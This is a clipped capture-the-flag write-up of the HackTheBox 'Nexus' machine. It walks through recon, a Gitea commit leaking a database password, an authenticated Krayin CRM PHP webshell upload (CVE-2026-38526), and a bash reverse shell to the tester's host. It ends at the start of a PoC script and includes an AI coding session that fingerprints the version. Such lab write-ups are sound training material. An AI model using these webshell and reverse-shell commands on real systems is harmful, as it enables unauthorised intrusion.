---
title: "HTB: Nexus | 0xdf hacks stuff"
source: https://0xdf.gitlab.io/2026/09/02/htb-nexus.html
source_host: 0xdf.gitlab.io
clip_date: 2026-09-17T10:49:29+08:00
trace_id: 0b08c63c-767a-42b4-a2f3-a9f9d4763acb
content_hash: ca773b92abedb1cdcb34bde3cf166218c77b305140e59cf7ef4107b83d9e71a0
status: synced
tags:
  - 漏洞分析
  - CTF
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: HTB Nexus 靶机：从公开 Gitea 仓库泄露凭据登录 Krayin，用 TinyMCE 上传拿 www-data，复用密码到 jones，最后借 root 模板同步脚本的 git 路径穿越提权到 root。
ai_summary_style: key-points
images_status:
  total: 31
  succeeded: 30
  failed_urls:
    - https://www.hackthebox.com/badge/image/260996
notion_page_id: 3de75244-d011-813d-92b1-ef02a2798d19
ioc:
  cves:
    - CVE-2026-38526
    - CVE-2026-41452
  cwes: []
  hashes:
    - 4a79809cfd6cb04e98319f9adfda65354e699e32
    - 58697f8b758d781a70f3476d6ac3d72a4a375478
    - 5ed7994a966439bc207a761ec6e556b850a3e284
    - 842716615594ea33aa6d0dfdd9a91b7080cd5aca
    - c3b4cb9c96f6515f807fc9b722ebb99ab8b89be7
    - e2b8ba489485a6a56e3342bb4c99da2071332335
    - ece59c72d4e8d5638dc6ae1e6cc368d2b60b2208
    - f4bc96e615c79a02a8868f7db48f003c
    - fd675e21b244e89ec9b96a9807c7a924a7b4a05b
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> HTB Nexus 靶机：从公开 Gitea 仓库泄露凭据登录 Krayin，用 TinyMCE 上传拿 www-data，复用密码到 jones，最后借 root 模板同步脚本的 git 路径穿越提权到 root。
> 
> - **侦察：** nmap 仅 22/80 开放，80 端口重定向到 nexus.htb；ffuf 子域爆破发现 git.nexus.htb（Gitea 1.26.0）与 billing.nexus.htb（Krayin CRM 登录页，Laravel）。
> - **凭据泄露：** Gitea 公开仓库第二次提交的 diff 中删除了 docker-compose/.env 的 DB_PASSWORD，明文为 `N27xh!!2ucY04`；配合邮箱 `j.matthew@nexus.htb` 成功登录 Krayin 2.2.0。
> - **初始 shell：** CVE-2026-38526，认证后可向 `/admin/tinymce/upload` 上传任意 PHP（需 multipart 表单与 `X-XSRF-TOKEN` 头），返回 `/storage/tinymce/<hash>.php` 路径，反弹 shell 得 www-data。
> - **横向移动：** `/var/www/krayin/.env` 中 `DB_PASSWORD=y27xb3ha!!74GbR` 被系统账户 jones 复用，`su` 与 SSH 均可登录并读取 user.txt。
> - **提权 root：** 滥用以 root 运行的模板同步脚本：Git 宽松的 safe.directory 设置、用 `ls-tree` 而非 checkout、路径拼接未过滤，构造目录穿越的 tree 对象污染 Gitea 仓库实现任意文件写入。另 Krayin 2.2.0 存在未认证安装器绕过（CVE-2026-41452）与 Laravel Debugbar 信息泄露。

[HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/nexus-cover.webp)

Nexus hosts a Krayin CRM instance backed by a Gitea server. I’ll dig through a public Gitea repository to find a Docker Compose file and environment configuration, recovering credentials to log into Krayin. From there, I’ll exploit an authenticated arbitrary file upload in Krayin’s TinyMCE endpoint to drop a PHP webshell and get a foothold as the web user. Krayin’s environment file leaks a database password that is reused for a system account, giving a shell as that user. To escalate to root, I’ll abuse a template sync script that runs as root, chaining Git’s permissive safe.directory setting, its use of ls-tree instead of checkout, and an unsanitized path join to poison a Gitea repository with a directory-traversal tree object and write a file anywhere on disk. In Beyond Root, I’ll cover an unauthenticated installer bypass that takes over the admin account, and how the Laravel debug bar leaks internal application details.

## Box Info

[![Nexus](https://0xdf.gitlab.io/icons/box-nexus.webp)](https://hackthebox.com/machines/nexus)

[Nexus](https://hackthebox.com/machines/nexus)

Easy

Release Date 23 Jun 2026

Retire Date 23 Jun 2026

![Linux](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/85d7b9cda22fbe98.png)

OS ![Linux](https://0xdf.gitlab.io/icons/Linux.webp)

Non-competitive release: no bloods

Creator [7u9y](https://app.hackthebox.com/users/260996)

![⚠️ 图片托管失败 · 7u9y](https://www.hackthebox.com/badge/image/260996)

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.234.54
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-29 11:52 UTC
Nmap scan report for 10.129.234.54
Host is up, received reset ttl 63 (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
oxdf@hacky$ sudo nmap -p 22,80 -sCV 10.129.234.54
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-29 11:53 UTC
Nmap scan report for 10.129.234.54
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

Based on the [OpenSSH and Nginx](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 24.04 Noble (LTS).

Both of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

There’s a redirect to `nexus.htb` on port 80.

### Subdomain Fuzz - TCP 80

The redirect to `nexus.htb` implies virtual host based routing on Nginx. Making requests to the host by IP just redirects to `nexus.htb`, dropping the path:

```css
oxdf@hacky$ curl -I http://10.129.234.54
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 29 Aug 2026 21:12:45 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://nexus.htb/

oxdf@hacky$ curl -I http://10.129.234.54/test
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 29 Aug 2026 21:12:49 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://nexus.htb/
```

Using a `Host` header that doesn’t exist also does the same redirect:

```css
oxdf@hacky$ curl -I http://10.129.234.54/ -H 'Host: 0xdf.nexus.htb'
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 29 Aug 2026 21:13:38 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://nexus.htb/
```

I’ll use `ffuf` to look for any subdomains of `nexus.htb` that don’t make this same redirect (`ffuf` filtering [video](https://www.youtube.com/watch?v=scHcQIDHcsc)):

```bash
oxdf@hacky$ ffuf -u http://10.129.234.54 -H 'Host: FUZZ.nexus.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.54
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.nexus.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

git                     [Status: 200, Size: 14474, Words: 1195, Lines: 242, Duration: 39ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 3348ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1923 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

It finds two hosts that respond differently. `git.nexus.htb` returns a 200 (likely a page), and `billing.nexus.htb` returns a 302 redirect. I’ll add both to my `/etc/hosts` file, along with the base domain:

```
10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb
```

I’ll scan each again with scripts targeting the hostname, but nothing interesting pops there that I won’t see below.

### nexus.htb - TCP 80

#### Site

![image-20260829174745938](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9a2395e1df8c1e55.png)

The site is for a renewable energy company:

 ![image-20260829174210597](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829174210597.webp)![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

All of the links go to anchors on this main page. The most interesting link is the “View role” button next to the open job, which loads a popup:

![image-20260829174329292](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eb14df8f850ae59b.png)

![image-20260829174329292](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829174329292.webp)

At the bottom of the popup there are two emails, `careers@nexus.htb` and `j.matthew@nexus.htb`.

#### Tech Stack

The HTTP response headers show just Nginx:

```yaml
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 29 Aug 2026 21:40:57 GMT
Content-Type: text/html
Last-Modified: Mon, 27 Apr 2026 13:02:26 GMT
Connection: keep-alive
ETag: W/"69ef5e62-c090"
Content-Length: 49296
```

The main page loads as `/index.html`, suggesting a static site.

The 404 page matches the default [Nginx 404](https://0xdf.gitlab.io/cheatsheets/404#nginx):

![image-20260829174439764](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829174439764.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but not find anything interesting:

```sql
oxdf@hacky$ feroxbuster -u http://nexus.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nexus.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1267l     3775w    49296c http://nexus.htb/
[####################] - 14s    30000/30000   0s      found:1       errors:2      
[####################] - 13s    30000/30000   2263/s  http://nexus.htb/
```

### billing.nexus.htb - TCP 80

#### Site

![image-20260829174745938](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829174745938.webp)

It’s a login page for [Krayin](https://krayincrm.com/).

#### Tech Stack

The HTTP response headers show Nginx as well as some cookies:

```yaml
HTTP/1.1 302 Found
Server: nginx/1.24.0 (Ubuntu)
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Sat, 29 Aug 2026 21:46:29 GMT
Location: http://billing.nexus.htb/admin/login
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjIvODBxWnJXSHVTanNBaEcyYVlSWkE9PSIsInZhbHVlIjoidi9oUmloWWNPWWRpZXFnejFGa1B3cTQwU1MzeGFmeXhVdW9zRkd4dDJzT2lUTjkzQnIreDVsMDN2WTdSMXJ1c0FRQSt0alF4UGJRK2Q1WUlqd3hUUzdYSzY5OWVpM21JM1JXV2kwWDlpZUhhdEdtNDFPMkFNcDVleWNNaldGa0kiLCJtYWMiOiJhZWIwMDM2NjVjNDQ1NzM4ZGJiNTZlMDdiNDU5NWIxNDk3MDU5MDAxNTY2MjEyYWYyZmJiMzM1OGJhNDA5ZTdlIiwidGFnIjoiIn0%3D; expires=Sat, 29 Aug 2026 23:46:29 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: krayin_crm_session=eyJpdiI6IjVnSGxBcHdYQUZHWGdnSmQ5NkRTUEE9PSIsInZhbHVlIjoiYzdXMUJBT3ZTOThZdUw1TFZBbGtHZU42V2ZVcXlGekpHRDJLZXRZakF3dkIySkJTNW1iYThDRWJnU2F1SGxGZWxES3hiZ1lNZGFObXFCNkZZVTVzMWEzd29IKzVCbW91bFdTY0lFYzRIbzhIckdIQ0dRbndqaU51Q2RyWkdma08iLCJtYWMiOiI1ZmZmOTg1MDBkMGNhZDIyNDY4ODEwYjNlOWRlYzk3Nzc2YmY3ZmUwNTY3OGVlNjI2MDUyNmQ0MTMwNmMzZmM0IiwidGFnIjoiIn0%3D; expires=Sat, 29 Aug 2026 23:46:29 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Content-Length: 390
```

This cookie pattern, `XSRF-TOKEN` and `<something>_session`, both long base64 objects, looks very much like [Laravel framework](https://laravel.com/). Laravel typically sets two cookies of this exact format.

The bar at the bottom of the page is the [Laravel Debug bar](https://laravel-news.com/laravel-debugbar-4-0-0):

![image-20260829191638671](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b50cffd50b85342c.png)

![image-20260829191638671](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829191638671.webp)

The Laravel Debug bar should not be exposed publicly, but it doesn’t provide a path to anything useful here. I’ll explore it in [Beyond Root](#laravel-debug).

This all fits as [Krayin](https://krayincrm.com/) describes itself as a:

> Free & Open Source Self-hosted CRM built on Laravel (PHP) to empower customer relationships

It’s non-trivial to find the version of Krayin, but it can be done by comparing publicly exposed files to various commits in Git. Claude is very good at that:

```sql
 ▐▛███▛█   Claude Code v2.1.251
▝▜██████▀  Opus 5 · Claude Max
  ▝▝ ▝▝    /home/oxdf/hackthebox/nexus

❯ can you figure out what version of krayin is running on billing.nexus.htb without creds?

● I'll check what's already known about this box, then probe the Krayin instance.

Searched for 1 pattern, ran 3 shell commands (ctrl+o to expand)

● Notes confirm debug mode is on and app root is /var/www/krayin. Let me hunt for a version string without authenticating.

  Ran 4 shell commands (ctrl+o to expand)

● Internet is available and the Vite manifest is public — that's a strong build fingerprint. Let me compare it against upstream Krayin releases.

  Ran 2 shell commands (ctrl+o to expand)

● Krayin doesn't ship built assets upstream, so hash-matching is unreliable. The Ignition debug page leaks actual source snippets — that's decisive. Let me pull one.

  Ran 7 shell commands (ctrl+o to expand)

● Now I'll diff that leaked source against every upstream tag, and cross-check which Krayin versions even support Laravel 12.54.

  Ran 2 shell commands (ctrl+o to expand)

● Laravel ^12 + PHP 8.3 already narrows it to the 2.2.x line. Now let me line-match the leaked source against each variant.

  Ran 1 shell command (ctrl+o to expand)

● Exact match on v2.2.0. Let me confirm with an independent fingerprint and test a live behavioral check.

  Ran 3 shell commands (ctrl+o to expand)

● The real installer route is /install (my earlier /installer hit was just an nginx directory). That gives a clean live discriminator between 2.2.0 and 2.2.1+.

  Ran 3 shell commands (ctrl+o to expand)

● Confirmed from three independent angles. Let me record it in the notes file.

Read 1 file (ctrl+o to expand)
● Krayin CRM v2.2.0 — no credentials needed. Krayin doesn't print its version anywhere unauthenticated, so I pinned it three independent ways:

1. Dependency floor (rules out ≤ v2.1.6). The Ignition debug page at /_debugbar/clockwork/1 leaks laravel_version 12.54.1, php_version 8.3.6. Upstream, Krayin ≤ v2.1.6 requires laravel/framework ^10.0; only v2.2.0+ moved to ^12.0 / PHP ^8.3. That leaves the 2.2.x line.

2. Leaked source byte-match (pins v2.2.0). That same page embeds a window.data JSON with full code_snippet blocks per stack frame, including one application frame: packages/Webkul/Installer/src/Http/Middleware/CanInstall.php:28. Diffing the leaked lines 13–42 against every tag's raw file:

  ┌───────────────┬────────────────────────────────────────────────────────┐
  │      tag      │                         match                          │
  ├───────────────┼────────────────────────────────────────────────────────┤
  │ v2.0.0–v2.2.0 │ exact                                                  │
  ├───────────────┼────────────────────────────────────────────────────────┤
  │ v2.2.1–v2.2.3 │ differs (refactored + abort_if($request->ajax(), 403)) │
  ├───────────────┼────────────────────────────────────────────────────────┤
  │ v2.2.4        │ differs (nested ajax check)                            │
  ├───────────────┼────────────────────────────────────────────────────────┤
  │ v2.2.5        │ differs (ajax exemption removed)                       │
  └───────────────┴────────────────────────────────────────────────────────┘

Intersect with #1 → only v2.2.0 survives.

3. Live behavioural confirmation. The three variants answer an AJAX-flagged GET /install differently. The real route is /install — the /installer 403 that looked interesting is just a real directory under public/:

  GET /install                                → 302 /admin/dashboard
  GET /install  X-Requested-With: XMLHttpRequest → 200 <title>Krayin Installer</title>

200 is the v2.2.0 signature (2.2.1–2.2.3 give 403, 2.2.4/2.2.5 redirect anyway).

One thing worth your attention that fell out of this: v2.2.0's isAlreadyInstalled() && ! $request->ajax() means that one client-controlled header walks past CanInstall on an already-installed instance, and the installer's API routes are declared Route::withoutMiddleware('web') — no CSRF, no auth: env-file-setup, run-migration, run-seeder, admin-config-setup. admin-config-setup would mint an admin account unauthenticated, a cleaner foothold than the credentialed TinyMCE upload in your existing notes.

I did not call any of those POST endpoints — run-migration/run-seeder/env-file-setup are destructive and would wipe or re-seed the box's DB. Only the safe GET was probed; say the word if you want me to work out the exact admin-config-setup request body.

✻ Crunched for 4m 53s · done 9:19 PM
```

Claude uses three different facts to pin the version at 2.2.0. The Laravel debug page gives the Laravel version (12.54.1), which means it’s above 2.1.6. It checks embedded `window.data` JSON data from a page against source code to find it’s in the range v2.0.0-v2.2.0. Intersecting that with the Laravel version gives v2.2.0. It confirms by checking the behavior of `/install` with a known CVE in that version (which I’ll play with in [Beyond Root](#cve-2026-41452)).

### git.nexus.htb - TCP 80

#### Site

The site is an instance of Gitea:

![image-20260829191939118](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4f9b11cb7f195b77.png)

![image-20260829191939118](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829191939118.webp)

Under Explore, I’ll see two users:

![image-20260829192008008](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10d25bf3ecce6ee6.png)

![image-20260829192008008](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829192008008.webp)

And one repo:

![image-20260829192021636](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8b8be900fe0252cc.png)

![image-20260829192021636](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829192021636.webp)

The repo has three files:

![image-20260829193401256](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9d8a5b52e49a41a2.png)

![image-20260829193401256](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260829193401256.webp)

The `docker-compose.yml` file is what sets up Krayin, including the application, MySQL, and PHPMyAdmin:

```yaml
version: '3.1'

services:
  krayin-app:
    image: webkul/krayin:latest
    ports:
      - "80:80"
    depends_on:
      - krayin-mysql
    volumes:
      - ./storage:/var/www/html/storage
    environment:
      APP_NAME: "Krayin CRM"
      APP_ENV: local
      APP_DEBUG: "true"
      APP_URL: http://test.htb
      APP_TIMEZONE: Asia/Kolkata
      APP_LOCALE: en
      APP_CURRENCY: USD
      DB_CONNECTION: mysql
      DB_HOST: krayin-mysql
      DB_PORT: 3306
      DB_DATABASE: krayin
      DB_USERNAME: krayin
      DB_PASSWORD: ${DB_PASSWORD}
    restart: unless-stopped

  krayin-mysql:
    image: mysql:8.0
    command: --default-authentication-plugin=mysql_native_password
    environment:
      MYSQL_DATABASE: krayin
      MYSQL_USER: krayin
      MYSQL_PASSWORD: ${DB_PASSWORD}
      MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASSWORD}
    volumes:
      - dbvolume:/var/lib/mysql
    restart: unless-stopped

  krayin-phpmyadmin:
    image: phpmyadmin:latest
    ports:
      - "8080:80"
    environment:
      PMA_HOST: krayin-mysql
      PMA_USER: krayin
      PMA_PASSWORD: ${DB_PASSWORD}
    restart: unless-stopped

volumes:
  dbvolume:
```

The database password is stored as a variable.

The `.env` file would set variables, but `DB_PASSWORD` is blank:

```bash
APP_NAME='Krayin CRM'
APP_ENV=local
APP_KEY=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD
VITE_HOST=
VITE_PORT=
LOG_CHANNEL=stack
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=
DB_PREFIX=
BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120
MEMCACHED_HOST=127.0.0.1
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379
MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com
MAIL_RECEIVER_DRIVER=sendgrid
IMAP_HOST=imap.nexus.htb
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=username1
IMAP_PASSWORD=password1
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1
MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

There is an `IMAP_PASSWORD`.

There are actually two commits to this repo:

![image-20260830064118312](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fc4b02c97813f04c.png)

![image-20260830064118312](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830064118312.webp)

Clicking on the second shows the changes from the first (where these files are created):

![image-20260830064205372](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/765b510ed3a9c4a3.png)

![image-20260830064205372](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830064205372.webp)

It’s changing the URL, as well as removing the database connection password, “N27xh!!2ucY04”.

#### Tech Stack

The page footer shows that this is Gitea version 1.26.0:

![image-20260830064407484](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4466f48f7176fd2b.png)

![image-20260830064407484](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830064407484.webp)

## Shell as www-data

### Authenticated Krayin

I have two email addresses and two passwords. The combination of `j.matthew@nexus.htb` and `N27xh!!2ucY04` works to login to Krayin:

 ![image-20260830064820005](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830064820005.webp)![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

There’s no data at all connected to this instance. Clicking on the “j” icon at the top right does show the Krayin version as 2.2.0, matching what [Claude found above](#tech-stack-1):

![image-20260830064909386](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fbaeec2c87108174.png)

![image-20260830064909386](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830064909386.webp)

In settings I’ll find some configurations. `j.matthew@nexus.htb` is the only user. The IMAP Password field is stored such that you can’t read it, but it’s in the raw HTML:

![image-20260830065146140](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/33dd023d5e80c521.png)

![image-20260830065146140](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830065146140.webp)

Still, this seems like a placeholder and not a real password.

### Vulnerability Identification

Searching for “krayin 2.2.0” actually turns up a few different CVEs that might be of interest:

![image-20260830071120482](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2fac6d1a242c677b.png)

![image-20260830071120482](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830071120482.webp)

The Jiva Security and Rapid 7 posts are about CVE-2026-41452, which is an unauthenticated account takeover vulnerability. As I already have creds, it’s not part of the intended path, but I’ll go into it in [Beyond Root](#cve-2026-41452).

The other two are about CVE-2026-38526, which is an authenticated RCE vulnerability.

### CVE-2026-38526 Background

NIST describes [CVE-2026-38526](https://nvd.nist.gov/vuln/detail/cve-2026-38526) as:

> An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.

It is as simple as this authenticated upload API endpoint allows for uploading arbitrary PHP files, which can then be accessed and run as PHP files on the server. [This advisory](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md) walks through how to exploit it in four steps:

1.  Authenticate
2.  Upload PHP File
3.  Retrieve Upload Path
4.  Execute Arbitrary Code

### WebShell

#### Upload

If I try to visit `/admin/tinymce/upload` in a browser, it crashes. Because the debug mode is on, it shows why:

![image-20260830093624050](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8e6082f623c74856.png)

![image-20260830093624050](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830093624050.webp)

Only POST requests are allowed.

I’ll send that request to Burp Repeater, and right click and select “Change request method”:

![image-20260830145200122](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ee76bb564793def9.png)

![image-20260830145200122](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830145200122.webp)

That switches it to a POST. I’ll send this, and it fails:

![image-20260830145258067](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8c9e7c46d2996e84.png)

![image-20260830145258067](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830145258067.webp)

Laravel loves throwing 419s, and it usually has to do with the XSRF token. It’s already present as a cookie, but on POST requests it also needs to be sent as a header. The cookie value is URL-encoded, so the header needs the decoded form. I’ll add it, and it returns 200 OK, with an empty result:

![image-20260830145526463](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/42322cece7f41fbd.png)

![image-20260830145526463](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830145526463.webp)

To actually exploit this, I’ll need to add a payload. This endpoint expects multipart form data, so I’ll replace the `Content-Type` header value with `multipart/form-data; boundary=--boundary`, and then add that to the body:

![image-20260830150105453](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9df5acf0e71025f3.png)

![image-20260830150105453](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260830150105453.webp)

The result is the location of the webshell, in this case `/storage/tinymce/f4bc96e615c79a02a8868f7db48f003c.php`.

#### Use

I’ll test the webshell with `curl`:

```kotlin
oxdf@hacky$ curl --data-urlencode 'cmd=id' http://billing.nexus.htb/storage/tinymce/f4bc96e615c79a02a8868f7db48f003c.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It works! That’s RCE as www-data.

I’ll start `nc` listening and replace `id` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```
oxdf@hacky$ curl --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.15.169/443 0>&1"' http://billing.nexus.htb/storage/tinymce/f4bc96e615c79a02a8868f7db48f003c.php
```

It just hangs, but at my listening `nc`:

```ruby
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.54 58994
bash: cannot set terminal process group (1440): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nexus:~/krayin/storage/app/public/tinymce$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```ruby
www-data@nexus:~/krayin/storage/app/public/tinymce$ script /dev/null -c bash
script /dev/null -c bash 
Script started, output log file is '/dev/null'.
www-data@nexus:~/krayin/storage/app/public/tinymce$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@nexus:~/krayin/storage/app/public/tinymce$ 
```

### CVE-2026-38526 Script

#### Analysis

I like executing this kind of exploit manually, but there are POC scripts for this vulnerability, like [this one](https://github.com/NathanHimself/CVE-2026-38526-PoC) from NathanHimself on GitHub that came out over a month before Nexus released.

The first 26 lines of the script are just imports, parsing args, and preparing variables for later use:

```python
import requests
import urllib.parse
import argparse
import re
import subprocess
import sys

parser = argparse.ArgumentParser(
    description="CVE-2026-38526 PoC - Krayin CRM RCE",
    formatter_class=argparse.RawTextHelpFormatter,
